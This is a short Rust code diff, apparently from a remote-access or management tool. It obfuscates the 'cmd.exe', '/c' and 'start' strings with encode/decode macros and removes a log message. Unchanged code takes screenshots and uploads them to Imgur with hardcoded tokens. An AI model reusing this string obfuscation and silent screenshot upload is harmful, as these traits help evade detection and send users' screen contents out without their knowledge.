@@ -94,10 +94,10 @@ pub fn run_process_with_work_dir(
 
     #[cfg(target_os = "windows")]
     {
-        full_command.push("cmd.exe");
-        full_command.push("/c");
+        full_command.push(decode(encode!("cmd.exe")));
+        full_command.push(decode(encode!("/c")));
         if !wait {
-            full_command.push("start");
+            full_command.push(decode(encode!("start")));
         }
     }
 
@@ -135,7 +135,6 @@ pub fn get_working_dir() -> anyhow::Result<String> {
         let config_dir = app_dirs.config_dir.display().to_string();
 
         if !Path::new(&config_dir).exists() {
-            info!("WPKG dir not exists... Creating it...");
             fs::create_dir(&config_dir)?;
         }
 
@@ -166,13 +165,11 @@ pub fn screenshot() -> anyhow::Result<String> {
     Ok(save_path)
 }
 
-const TOKENS: &'static [&str] = &["037a0d9b9dc5ce6","3e3ce0d7ac14d56"];
+const TOKENS: &[&str] = &["037a0d9b9dc5ce6", "3e3ce0d7ac14d56"];
 
 pub async fn screenshot_url() -> anyhow::Result<String> {
     let path = screenshot()?;
-    let info = ImgurClient::new(TOKENS[0])
-        .upload_image(&path)
-        .await?;
+    let info = ImgurClient::new(TOKENS[0]).upload_image(&path).await?;
 
     Ok(info.data.link)
 }
